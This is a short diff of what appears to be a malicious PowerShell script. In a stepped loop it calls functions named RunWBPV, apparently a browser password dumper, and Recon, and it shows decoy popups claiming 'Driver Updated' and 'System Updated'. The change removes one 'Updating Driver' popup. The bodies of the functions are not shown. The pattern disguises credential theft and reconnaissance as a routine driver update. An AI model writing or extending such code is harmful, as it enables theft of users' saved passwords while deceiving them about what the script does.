@@ -530,9 +530,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
     switch ($step) {
 
-        1 { 
-            $done = New-Object -ComObject Wscript.Shell;$done.Popup("Updating Driver",1)
-            RunWBPV; $done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1) }
+        1 { RunWBPV; $done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1) }
         2 { Recon; $done = New-Object -ComObject Wscript.Shell;$done.Popup("System Updated",1) }
 
     }
